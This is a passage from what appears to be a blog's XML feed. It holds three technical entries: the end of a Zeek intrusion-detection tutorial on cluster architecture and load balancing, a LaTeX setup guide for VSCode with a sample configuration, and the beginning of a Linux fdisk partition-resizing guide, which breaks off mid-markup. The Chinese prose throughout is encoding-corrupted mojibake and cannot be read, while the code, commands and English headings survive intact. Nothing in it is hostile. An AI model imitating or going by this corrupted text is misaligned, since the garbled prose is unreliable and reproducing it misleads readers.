è®ºæ˜¯ç‹¬ç«‹è¿˜æ˜¯é›†ç¾¤éƒ½é‡‡ç”¨ç»Ÿä¸€çš„ç®¡ç†æ¡†æ¶</li><li>BSDè®¸å¯ä¸‹å¼€æº</li></ul></li><li><p><strong>Analysis</strong></p><ul><li>å…¨é¢è®°å½•æ´»åŠ¨ï¼Œä»¥è¿›è¡Œç¦»çº¿åˆ†æå’Œå–è¯</li><li>ç‹¬ç«‹ä¸åº”ç”¨å±‚åè®®çš„ç«¯å£åˆ†æ</li><li>æ”¯æŒè®¸å¤šåº”ç”¨ç¨‹åºå±‚åè®®ï¼ˆåŒ…æ‹¬DNSï¼ŒFTPï¼ŒHTTPï¼ŒIRCï¼ŒSMTPï¼ŒSSHï¼ŒSSLï¼‰</li><li>åˆ†æé€šè¿‡åº”ç”¨å±‚åè®®äº¤æ¢çš„æ–‡ä»¶å†…å®¹ï¼ŒåŒ…æ‹¬ç”¨äºæŒ‡çº¹è¯†åˆ«çš„MD5 / SHA1è®¡ç®—</li><li>å…¨é¢çš„IPv6æ”¯æŒ</li><li>éš§é“æ£€æµ‹å’Œåˆ†æï¼ˆåŒ…æ‹¬Ayiyaï¼ŒTeredoï¼ŒGTPv1ï¼‰ã€‚Zeekå°†éš§é“è§£å°è£…ï¼Œç„¶åç»§ç»­åˆ†æå…¶å†…å®¹ï¼Œå°±åƒæ²¡æœ‰éš§é“ä¸€æ ·</li><li>åœ¨åè®®åˆ†æè¿‡ç¨‹ä¸­è¿›è¡Œå…¨é¢çš„å¥å…¨æ€§æ£€æŸ¥</li><li>æ”¯æŒIDSæ ·å¼çš„æ¨¡å¼åŒ¹é…</li></ul></li><li><p><strong>Scripting Language</strong></p><ul><li>å›¾çµå®Œå¤‡çš„è¯­è¨€ï¼Œç”¨äºè¡¨è¾¾ä»»æ„åˆ†æä»»åŠ¡</li><li>åŸºäºäº‹ä»¶çš„ç¼–ç¨‹æ¨¡å‹</li><li>ç‰¹å®šäºåŸŸçš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚IPåœ°å€ï¼ˆé€æ˜åœ°å¤„ç†IPv4å’ŒIPv6ï¼‰ï¼Œç«¯å£å·å’Œè®¡æ—¶å™¨</li><li>æ”¯æŒåŸºäºæ—¶é—´çš„è·Ÿè¸ªå’Œç®¡ç†ç½‘ç»œçŠ¶æ€</li></ul></li><li><p><strong>Interfacing</strong></p><ul><li>é»˜è®¤è¾“å‡ºåˆ°æ ¼å¼è‰¯å¥½çš„ACSIIæ—¥å¿—</li><li><code>ElasticSearch</code>å’Œ<code>DataSeries</code>çš„å¤‡ç”¨åç«¯ï¼Œå¹¶å°†åç»­æ”¯æŒå…¶å®ƒæ•°æ®æ¥å£</li><li>å¤–éƒ¨è¾“å…¥å®æ—¶é›†æˆåˆ°åˆ†æä¸­ï¼Œå¹¶å°†åç»­æ”¯æŒå®æ—¶æ•°æ®åº“çš„è¾“å…¥</li><li>å¤–éƒ¨çš„Cåº“ç”¨äºä¸å¤–éƒ¨ç¨‹åºäº¤æ¢Zeekçš„äº‹ä»¶ï¼ŒåŒæ ·æ”¯æŒä¸Perlï¼ŒPythonå’ŒRubyçš„ç»‘å®š</li><li>èƒ½å¤Ÿä»è„šæœ¬è¯­è¨€å†…éƒ¨è§¦å‘ä»»æ„å¤–éƒ¨è¿›ç¨‹</li></ul></li></ul><h1 id="2-Zeeké›†ç¾¤æ¶æ„"><a href="#2-Zeeké›†ç¾¤æ¶æ„" class="headerlink" title="2 Zeeké›†ç¾¤æ¶æ„"></a>2 Zeeké›†ç¾¤æ¶æ„</h1><p><strong>ä¸ºä»€ä¹ˆZeekéœ€è¦é›†ç¾¤æ¶æ„ï¼Ÿå› ä¸ºZeekæ˜¯æ˜¯å•çº¿ç¨‹çš„ï¼Œå› æ­¤ä¸€æ—¦è¾¾åˆ°å•ä¸ªå¤„ç†å™¨å†…æ ¸çš„é™åˆ¶ï¼Œå½“å‰å”¯ä¸€çš„æ–¹æ³•å°±æ˜¯æŠŠå·¥ä½œè´Ÿè½½åˆ†æ•£åˆ°å¤šä¸ªå†…æ ¸ç”šè‡³æ˜¯å¤šä¸ªç‰©ç†æœºä¸Šã€‚</strong></p><h2 id="2-1-Cluster-Architecture"><a href="#2-1-Cluster-Architecture" class="headerlink" title="2.1 Cluster Architecture"></a>2.1 Cluster Architecture</h2><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/main/figure-2022/202210061328175.png"/></p><p>ä¸Šå›¾æ˜¯Zeekçš„é›†ç¾¤æ¶æ„ç¤ºæ„å›¾</p><ul><li><strong>Tap</strong>æ˜¯ä¸€ç§æœºåˆ¶ç”¨æ¥æ‹†åˆ†æ•°æ®æµå¹¶åˆ›å»ºå‰¯æœ¬ç”¨äºæ£€æµ‹ã€‚ä¾‹å¦‚äº¤æ¢æœºä¸Šçš„ç›‘æµ‹ç«¯å£å’Œå…‰çº¤ç½‘ç»œä¸Šçš„åˆ†å…‰è·¯å™¨ã€‚</li><li><strong>Frontend</strong>æ˜¯ä¸€ç§ç¦»æ•£çš„ç¡¬ä»¶è®¾å¤‡æˆ–ä¸»æœºæŠ€æœ¯ï¼Œå¯å°†æµé‡åˆ†ä¸ºè®¸å¤šæµã€‚Zeekçš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶ä¸æ‰§è¡Œæ­¤å·¥ä½œã€‚</li><li><strong>Manager</strong>æ˜¯ä¸€ä¸ªZeekçš„è¿›ç¨‹ï¼Œå…·æœ‰ä¸¤ä¸ªä¸»è¦ä»»åŠ¡ã€‚ç¬¬ä¸€ä¸ªæ˜¯ä»é›†ç¾¤çš„å…¶ä»–é‡‡ç”¨Zeeké€šä¿¡åè®®çš„èŠ‚ç‚¹æ¥æ”¶æ—¥å¿—å’Œé€šçŸ¥ï¼ˆå¦‚æœä½ ç”¨çš„æ˜¯loggeråˆ™ä¼šå–ä»£manageræ¥æ¥æ”¶æ‰€æœ‰çš„æ—¥å¿—ï¼‰å®ƒçš„è¾“å‡ºç»“æœæ˜¯ä¸€ä¸ªå•ç‹¬çš„æ—¥å¿—è€Œä¸æ˜¯è®¸å¤šéœ€è¦è¢«åæœŸå¤„ç†ç»„åˆçš„ç¦»æ•£çš„æ—¥å¿—ã€‚ç¬¬äºŒä¸ªä»»åŠ¡æ˜¯å®ƒèƒ½å¤Ÿä½œä¸ºé€šçŸ¥çš„é˜»å¡èŠ‚ç‚¹æ¥è¿›è¡Œé‡å¤æ•°æ®åˆ é™¤æ“ä½œå’Œé€šçŸ¥è¡Œä¸ºåŒ–æ“ä½œï¼ˆå¦‚å°†é€šçŸ¥ä»¥é‚®ä»¶å½¢å¼å‘é€ï¼Œåˆ†é¡µæˆ–è€…é˜»æ­¢ï¼‰ã€‚</li><li><strong>Logger</strong>æ˜¯ä¸€ä¸ªå¯é€‰çš„Zeekè¿›ç¨‹ï¼Œå®ƒä½¿ç”¨Zeeké€šä¿¡åè®®ä»ç¾¤é›†çš„å…¶ä½™èŠ‚ç‚¹æ¥æ”¶æ—¥å¿—æ¶ˆæ¯ã€‚è®©loggerä»£æ›¿manageræ¥æ”¶æ—¥å¿—çš„ç›®çš„æ˜¯ä¸ºäº†å‡è½»managerçš„è´Ÿæ‹…ã€‚</li><li><strong>Proxy</strong>æ˜¯ä¸€ä¸ªç”¨äºåŒæ­¥çŠ¶æ€çš„Zeekè¿›ç¨‹ï¼Œå˜é‡èƒ½å¤Ÿè‡ªåŠ¨åœ°åœ¨è¿æ¥çš„Zeekè¿›ç¨‹é—´åŒæ­¥ã€‚proxyé¿å…äº†æ‰€æœ‰workeréƒ½ç›¸äº’ç›´è¿ã€‚</li><li><strong>Worker</strong>æ˜¯å—…æ¢ç½‘ç»œæµé‡å¹¶å¯¹é‡æ–°ç»„åˆçš„æµé‡è¿›è¡Œåè®®åˆ†æçš„Zeekè¿›ç¨‹ã€‚ç”±äºä¸€ä¸ªé›†ç¾¤çš„æ‰€æœ‰åè®®è§£æå’Œå¤§å¤šæ•°åˆ†æéƒ½å°†åœ¨æ­¤å¤„è¿›è¡Œï¼Œå› æ­¤å»ºè®®é‡‡ç”¨å°½å¯èƒ½é«˜æ€§èƒ½çš„å†…å­˜å’ŒCPUã€‚å› ä¸ºå‡ ä¹æ‰€æœ‰æ—¥å¿—è®°å½•éƒ½æ˜¯åœ¨è¿œç¨‹å¯¹managerå®Œæˆçš„ï¼Œå¹¶ä¸”é€šå¸¸å¾ˆå°‘å†™å…¥ç£ç›˜ï¼Œå› æ­¤workerså¯¹ç£ç›˜æ²¡æœ‰ç‰¹æ®Šè¦æ±‚ã€‚</li></ul><h2 id="2-2-Frontend-Options"><a href="#2-2-Frontend-Options" class="headerlink" title="2.2 Frontend Options"></a>2.2 Frontend Options</h2><h3 id="2-2-1-åˆ†ç«‹çš„ç¡¬ä»¶æµé‡å¹³è¡¡å™¨"><a href="#2-2-1-åˆ†ç«‹çš„ç¡¬ä»¶æµé‡å¹³è¡¡å™¨" class="headerlink" title="2.2.1 åˆ†ç«‹çš„ç¡¬ä»¶æµé‡å¹³è¡¡å™¨"></a>2.2.1 åˆ†ç«‹çš„ç¡¬ä»¶æµé‡å¹³è¡¡å™¨</h3><ul><li><strong>cPacketï¼š</strong>å¦‚æœè¦ç›‘è§†ä¸€ä¸ªæˆ–å¤šä¸ª10Gç‰©ç†æ¥å£ï¼Œå»ºè®®çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨cPacketçš„cFlowæˆ–cVuè®¾å¤‡ï¼Œè¿™äº›è®¾å¤‡å°†é€šè¿‡é‡å†™ç›®æ ‡ä»¥å¤ªç½‘MACåœ°å€ä»¥ä½¿ä¸ç‰¹å®šæµå…³è”çš„æ¯ä¸ªæ•°æ®åŒ…å…·æœ‰ç›¸åŒçš„ç›®æ ‡MACï¼Œæ¥æ‰§è¡Œç¬¬2å±‚è´Ÿè½½å¹³è¡¡ã€‚ç„¶åå¯ä»¥å°†æ•°æ®åŒ…ç›´æ¥ä¼ é€’åˆ°ç›‘è§†ä¸»æœºï¼Œåœ¨ç›‘è§†ä¸»æœºä¸Šï¼Œæ¯ä¸ªworkeréƒ½æœ‰ä¸€ä¸ªBPF Filterä»¥å°†å…¶å¯è§æ€§é™åˆ¶ä¸ºä»…è¯¥æµï¼Œæˆ–è€…ç»§ç»­ä¼ é€’åˆ°å•†ç”¨äº¤æ¢æœºï¼Œä»¥å°†æµé‡æ‹†åˆ†ä¸ºå¤šä¸ªä»¥é€‚é…workerçš„1Gæ¥å£ã€‚ä»è€Œå¤§å¤§é™ä½æˆæœ¬ã€‚</li><li><strong>OpenFlow Switchesï¼š</strong>åŸºäºOpenFlowçš„äº¤æ¢æœºç›´æ¥åœ¨äº¤æ¢æœºä¸Šè¿›è¡ŒåŸºäºæµçš„è´Ÿè½½å¹³è¡¡ï¼Œä»è€Œå¤§å¤§é™ä½äº†è®¸å¤šç”¨æˆ·çš„å‰ç«¯æˆæœ¬ã€‚<strong>å®˜æ–¹æ­£åœ¨æ¢ç´¢ä¸­â€¦</strong></li></ul><h3 id="2-2-2-ä¸»æœºæµé‡å¹³è¡¡æœºåˆ¶"><a href="#2-2-2-ä¸»æœºæµé‡å¹³è¡¡æœºåˆ¶" class="headerlink" title="2.2.2 ä¸»æœºæµé‡å¹³è¡¡æœºåˆ¶"></a>2.2.2 ä¸»æœºæµé‡å¹³è¡¡æœºåˆ¶</h3><ul><li><strong>PF_RINGï¼š </strong>Linuxçš„PF_RINGè½¯ä»¶å…·æœ‰â€œç¾¤é›†â€åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å°†åœ¨å—…æ¢åŒä¸€æ¥å£çš„å¤šä¸ªè¿›ç¨‹ä¹‹é—´è¿›è¡ŒåŸºäºæµçš„è´Ÿè½½å¹³è¡¡ã€‚è¿™ä½¿æ‚¨å¯ä»¥è½»æ¾åœ°åœ¨å•ä¸ªç‰©ç†ä¸»æœºä¸­åˆ©ç”¨å¤šä¸ªå†…æ ¸ï¼Œå› ä¸ºBroçš„ä¸»äº‹ä»¶å¾ªç¯æ˜¯å•çº¿ç¨‹çš„ï¼Œå› æ­¤æ— æ³•æœ¬æœºåˆ©ç”¨æ‰€æœ‰å†…æ ¸ã€‚å¦‚æœè¦ä½¿ç”¨PF_RINGï¼Œè¯·å‚é˜…æœ‰å…³å¦‚ä½•ä½¿ç”¨PF_RINGé…ç½®Zeekçš„<a href="http://bro.org/documentation/load-balancing.html">æ–‡æ¡£</a>ã€‚</li><li><strong>Netmapï¼š</strong> FreeBSDæœ‰ä¸€ä¸ªæ­£åœ¨è¿›è¡Œçš„åä¸ºNetmapçš„é¡¹ç›®ï¼Œè¯¥é¡¹ç›®è¿˜å°†å¯ç”¨åŸºäºæµçš„è´Ÿè½½å¹³è¡¡ã€‚<strong>å®˜æ–¹æ­£åœ¨æ¢ç´¢ä¸­â€¦</strong></li><li><strong>Software Routerï¼š</strong> å¯ä»¥é€šè¿‡ç®€å•çš„é…ç½®ç”¨äºåŸºäºæµçš„è´Ÿè½½å¹³è¡¡ã€‚ç”±äºZeekçš„PF_RINGæ”¯æŒï¼Œå› æ­¤ä¸å»ºè®®åœ¨Linuxä¸Šä½¿ç”¨æ­¤è§£å†³æ–¹æ¡ˆï¼Œå¹¶ä¸”ä»…å°†å…¶ä½œä¸ºå…¶ä»–æ“ä½œç³»ç»Ÿä¸Šçš„ä¸å¾—å·²çš„æ–¹æ³•ï¼Œå› ä¸ºè¯¥è§£å†³æ–¹æ¡ˆä¼šå› æ¯ä¸ªæ•°æ®åŒ…åœ¨å†…æ ¸å’Œç”¨æˆ·åŸŸä¹‹é—´æ¥å›ä¸Šä¸‹æ–‡åˆ‡æ¢æ•°æ¬¡è€Œå¯¼è‡´å¤§é‡å¼€é”€ã€‚</li></ul>]]></content>
    
    
    <categories>
      
      <category>Tutorial</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDS</tag>
      
      <tag>Zeek</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€LaTeXã€‘VSCodeç¯å¢ƒé…ç½®</title>
    <link href="/2020/01/23/%E3%80%90LaTeX%E3%80%91VSCode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2020/01/23/%E3%80%90LaTeX%E3%80%91VSCode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>LaTeX + VSCodeï¼Œæ–°å§¿åŠ¿å¢é•¿äº†ï¼Œå¥‡æ€ªçš„çŸ¥è¯†ä¹Ÿå¢åŠ äº†ï¼</p><span id="more"></span><h2 id="1-å®‰è£…TeXlive"><a href="#1-å®‰è£…TeXlive" class="headerlink" title="1 å®‰è£…TeXlive"></a>1 å®‰è£…TeXlive</h2><ul><li>å‰å¾€<a href="https://www.tug.org/texlive/">å®˜ç½‘</a>ä¸‹è½½å®‰è£…ç¨‹åºï¼š<ul><li><a href="http://mirror.ctan.org/systems/texlive/tlnet/install-tl-windows.exe">Windowså®‰è£…åŒ…</a></li><li><a href="http://mirror.ctan.org/systems/texlive/tlnet/install-tl-unx.tar.gz">Unixå®‰è£…åŒ…</a></li><li><a href="https://www.tug.org/mactex/mactex-download.html">MacTeXå®‰è£…åŒ…</a></li></ul></li><li><p>å‰å¾€å›½å†…é•œåƒç«™ä¸‹è½½ï¼š<a href="http://mirrors.hust.edu.cn/CTAN/systems/texlive/Images/">åä¸­å¤§é•œåƒç«™</a>ï¼Œ <a href="https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/">æ¸…åå¤§å­¦é•œåƒç«™</a>ï¼Œ <a href="https://mirrors.ustc.edu.cn/CTAN/systems/texlive/Images/">ä¸­ç§‘å¤§é•œåƒç«™</a></p></li><li><p><strong>æ·»åŠ ç¯å¢ƒå˜é‡</strong>ï¼Œå¹¶ç¡®è®¤å¯ç”¨æ€§</p></li></ul><pre><code class="hljs bash">Î» tex -vTeX 3.14159265 (TeX Live 2019/W32TeX)kpathsea version 6.3.1Copyright 2019 D.E. Knuth.There is NO warranty.  Redistribution of this software iscovered by the terms of both the TeX copyright andthe Lesser GNU General Public License.For more information about these matters, see the filenamed COPYING and the TeX <span class="hljs-built_in">source</span>.Primary author of TeX: D.E. Knuth.</code></pre><h2 id="2-é…ç½®VSCode"><a href="#2-é…ç½®VSCode" class="headerlink" title="2 é…ç½®VSCode"></a>2 é…ç½®VSCode</h2><h3 id="2-1-å®‰è£…LaTeX-Workshopæ’ä»¶"><a href="#2-1-å®‰è£…LaTeX-Workshopæ’ä»¶" class="headerlink" title="2.1 å®‰è£…LaTeX-Workshopæ’ä»¶"></a>2.1 å®‰è£…LaTeX-Workshopæ’ä»¶</h3><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200304155204.png" alt=""></p><h3 id="2-2-è®¾ç½®VSCodeé…ç½®æ–‡ä»¶"><a href="#2-2-è®¾ç½®VSCodeé…ç½®æ–‡ä»¶" class="headerlink" title="2.2 è®¾ç½®VSCodeé…ç½®æ–‡ä»¶"></a>2.2 è®¾ç½®VSCodeé…ç½®æ–‡ä»¶</h3><p><code>settings.json</code></p><pre><code class="hljs JSON"><span class="hljs-punctuation">&#123;</span>    <span class="hljs-attr">&quot;latex-workshop.latex.recipes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lualatex-&gt;bibtex-&gt;lualatex*2&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;tools&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                <span class="hljs-string">&quot;lualatex&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;bibtex&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;lualatex&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;lualatex&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-punctuation">]</span>        <span class="hljs-punctuation">&#125;</span>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;latex-workshop.latex.tools&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>        <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lualatex&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lualatex&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                <span class="hljs-string">&quot;-synctex=1&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;-interaction=nonstopmode&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;-file-line-error&quot;</span><span class="hljs-punctuation">,</span>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span>            <span class="hljs-punctuation">]</span>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>        <span class="hljs-punctuation">&#123;</span>            <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bibtex&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;bibtex&quot;</span><span class="hljs-punctuation">,</span>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>                <span class="hljs-string">&quot;%DOCFILE%&quot;</span>            <span class="hljs-punctuation">]</span>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>    <span class="hljs-attr">&quot;latex-workshop.view.pdf.viewer&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tab&quot;</span><span class="hljs-punctuation">,</span>    # <span class="hljs-attr">&quot;latex-workshop.latex.autoBuild.run&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;never&quot;</span><span class="hljs-punctuation">&#125;</span></code></pre><h3 id="2-3-ä½¿ç”¨è¯´æ˜"><a href="#2-3-ä½¿ç”¨è¯´æ˜" class="headerlink" title="2.3 ä½¿ç”¨è¯´æ˜"></a>2.3 ä½¿ç”¨è¯´æ˜</h3><ul><li><p>å½“ä½ åœ¨VSCodeç¼–è¾‘<code>.tex</code>æ ¼å¼çš„æ–‡ä»¶æ—¶ï¼ŒLaTeX-Workshopæ’ä»¶ä¼šå¼€å§‹å·¥ä½œ</p></li><li><p>ç¼–è¯‘ç”Ÿæˆpdfçš„æŒ‡ä»¤ä¸º<code>Ctrl + Alt + B</code></p></li><li><p><code>Ctrl + S</code>ä¿å­˜æ–‡ä»¶çš„åŒæ—¶ä¼šé»˜è®¤æ‰§è¡Œç¼–è¯‘ï¼Œè‹¥æƒ³å»é™¤æ­¤æœºåˆ¶ï¼Œå¯ä»¥åœ¨jsonè®¾ç½®æ–‡ä»¶ä¸­çš„åŠ å…¥ï¼š</p><pre><code class="hljs json"><span class="hljs-attr">&quot;latex-workshop.latex.autoBuild.run&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;never&quot;</span></code></pre></li></ul><h2 id="3-ç”¨LaTeXç¼–è¯‘ç¬¬ä¸€ä¸ªpdf"><a href="#3-ç”¨LaTeXç¼–è¯‘ç¬¬ä¸€ä¸ªpdf" class="headerlink" title="3 ç”¨LaTeXç¼–è¯‘ç¬¬ä¸€ä¸ªpdf"></a>3 ç”¨LaTeXç¼–è¯‘ç¬¬ä¸€ä¸ªpdf</h2><p>æ–°å»º<code>hello.tex</code>æ–‡ä»¶</p><pre><code class="hljs tex"><span class="hljs-keyword">\documentclass</span>&#123;article&#125;  <span class="hljs-comment">% é€‰æ‹©æ¨¡ç‰ˆï¼Œä½¿ç”¨Latexè‡ªå¸¦çš„articleæ¨¡ç‰ˆ</span><span class="hljs-keyword">\author</span>&#123;my name&#125;<span class="hljs-keyword">\title</span>&#123;Title&#125;<span class="hljs-keyword">\usepackage</span>&#123;graphicx&#125;   <span class="hljs-comment">% æ’å…¥å›¾ç‰‡ç”¨åˆ°çš„å®åŒ…</span><span class="hljs-keyword">\usepackage</span>&#123;multirow&#125;   <span class="hljs-comment">% æ’å…¥è¡¨æ ¼ç”¨åˆ°çš„å®åŒ…</span><span class="hljs-keyword">\begin</span>&#123;document&#125; <span class="hljs-keyword">\maketitle</span>    <span class="hljs-keyword">\section</span>&#123;Hello China&#125; China is in East Asia. <span class="hljs-keyword">\subsection</span>&#123;Hello Hubei&#125; Hubei Province is located in central China.    <span class="hljs-keyword">\subsubsection</span>&#123;Hello Wuhan&#125;         <span class="hljs-keyword">\paragraph</span>&#123;HUST&#125;is Huazhong University of Science and Technology.         <span class="hljs-keyword">\subparagraph</span>&#123;Dian Group&#125; is a student innovation technology team.    <span class="hljs-keyword">\subsection</span>&#123;Test&#125;        <span class="hljs-keyword">\centering</span>        <span class="hljs-keyword">\begin</span>&#123;tabular&#125;&#123;|c|c|c|c|&#125;         <span class="hljs-keyword">\hline</span>         t <span class="hljs-built_in">&amp;</span> e <span class="hljs-built_in">&amp;</span> s <span class="hljs-built_in">&amp;</span> t<span class="hljs-keyword">\\</span>         <span class="hljs-keyword">\hline</span>         1 <span class="hljs-built_in">&amp;</span> 2 <span class="hljs-built_in">&amp;</span> 3 <span class="hljs-built_in">&amp;</span> 4<span class="hljs-keyword">\\</span>         <span class="hljs-keyword">\hline</span>         <span class="hljs-keyword">\end</span>&#123;tabular&#125;<span class="hljs-keyword">\end</span>&#123;document&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeX</tag>
      
      <tag>VSCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxç£ç›˜åˆ†åŒºæ‰©å®¹</title>
    <link href="/2019/12/12/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%89%A9%E5%AE%B9/"/>
    <url>/2019/12/12/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%89%A9%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ä¸»ç³»ç»Ÿä»¥å¤–çš„ç³»ç»Ÿ(æ— è®ºæ˜¯è™šæ‹Ÿæœºè¿˜æ˜¯å¤šç³»ç»Ÿ)åˆ†é…ç£ç›˜ç©ºé—´æ—¶æˆ‘ä»¬å¸¸å¸¸<strong>æ¯”è¾ƒä¿å®ˆ</strong>ï¼Œå¯èƒ½ä¼šé¢ä¸´éœ€è¦æ‰©å®¹æ ¹åˆ†åŒºçš„æƒ…å†µã€‚<span id="more"></span></p><h1 id="Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆéLVMï¼‰"><a href="#Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆéLVMï¼‰" class="headerlink" title="Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆéLVMï¼‰"></a>Linuxç£ç›˜åˆ†åŒºæ‰©å®¹ï¼ˆéLVMï¼‰</h1><h2 id="1-é€‚ç”¨åœºæ™¯"><a href="#1-é€‚ç”¨åœºæ™¯" class="headerlink" title="1 é€‚ç”¨åœºæ™¯"></a>1 é€‚ç”¨åœºæ™¯</h2><p>åœ¨ä¸ºä¸»ç³»ç»Ÿä»¥å¤–çš„ç³»ç»Ÿ(æ— è®ºæ˜¯è™šæ‹Ÿæœºè¿˜æ˜¯å¤šç³»ç»Ÿ)åˆ†é…ç£ç›˜ç©ºé—´æ—¶æˆ‘ä»¬å¸¸å¸¸<strong>æ¯”è¾ƒä¿å®ˆ</strong>ï¼Œè¿™æ ·å¯èƒ½ä¼šé‡åˆ°æ ¹åˆ†åŒºç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå¦‚å›¾ï¼š</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102191126.png" alt=""></p><p>ä½†æ˜¯æˆ‘ä»¬çš„ç£ç›˜ä¸Šè¿˜æœ‰ç©ºé—²çš„ç©ºé—´æœªä½¿ç”¨ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å°†æœªä½¿ç”¨éƒ¨åˆ†æ‰©å±•åˆ°ç›¸é‚»çš„åˆ†åŒºä¸­ã€‚</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102192359.png" alt=""></p><h2 id="2-å®ç°"><a href="#2-å®ç°" class="headerlink" title="2 å®ç°"></a>2 å®ç°</h2><h3 id="2-1-è¿›å…¥rescue-mode"><a href="#2-1-è¿›å…¥rescue-mode" class="headerlink" title="2.1 è¿›å…¥rescue mode"></a>2.1 è¿›å…¥rescue mode</h3><ul><li><p>å¦‚æœ<strong>æ‰©å®¹çš„å¯¹è±¡æ˜¯æ ¹åˆ†åŒº(ç³»ç»Ÿåˆ†åŒº)</strong>ï¼Œåˆ™é¦–å…ˆéœ€è¦è¿›å…¥rescue modeã€‚å¦‚æœæ‰©å®¹å¯¹è±¡ä¸ºéç³»ç»Ÿåˆ†åŒºï¼Œå¦‚/homeç­‰ï¼Œåˆ™ä¸éœ€è¦è¿›å…¥rescue modeã€‚</p><p>ä¸€ä¸ªç®€å•åˆ¤å®šæ˜¯å¦éœ€è¦è¿›å…¥rescue mode æˆ–è€…ä½¿ç”¨å®‰è£…é•œåƒUç›˜å¯åŠ¨çš„æ–¹æ³•æ˜¯ï¼Œ<code>umount</code>æ­¤æ¬¡æ‰©å®¹çš„å¯¹è±¡ï¼Œæ“ä½œç³»ç»Ÿæ˜¯å¦ä¼šå—åˆ°å½±å“ã€‚</p><ul><li>é”®å…¥å‘½ä»¤<code>init 1</code>ï¼ˆå•ç”¨æˆ·æ¨¡å¼ï¼Œä»…rootï¼‰è¿›å…¥åˆ°rescue mode</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102205559.png" alt=""></p><ul><li>æˆ–è€…åœ¨grubç•Œé¢é€‰æ‹©advancedå¯åŠ¨é¡¹é‡Œçš„recovery mode</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102205706.png" alt=""></p><p>æœ€ç»ˆè¿˜æ˜¯è¿›å…¥åˆ°æ­¤ç•Œé¢</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210135.png" alt=""></p></li></ul><h3 id="2-2-åˆ é™¤å¾…æ‰©å®¹çš„åˆ†åŒº"><a href="#2-2-åˆ é™¤å¾…æ‰©å®¹çš„åˆ†åŒº" class="headerlink" title="2.2 åˆ é™¤å¾…æ‰©å®¹çš„åˆ†åŒº"></a>2.2 åˆ é™¤å¾…æ‰©å®¹çš„åˆ†åŒº</h3><ul><li><code>fdisk /dev/sda</code> æ‰“å¼€<strong>fdisk</strong>å·¥å…·ï¼Œé”®å…¥<code>p</code>æ‰“å°å½“å‰/dev/sdaç£ç›˜çš„ä¿¡æ¯ï¼š</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210505.png" alt=""></p><ul><li>ä¾æ¬¡é”®å…¥<code>d</code>ï¼Œ<code>2</code>ï¼Œåˆ é™¤/dev/sda2åˆ†åŒº</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210624.png" alt=""></p><h3 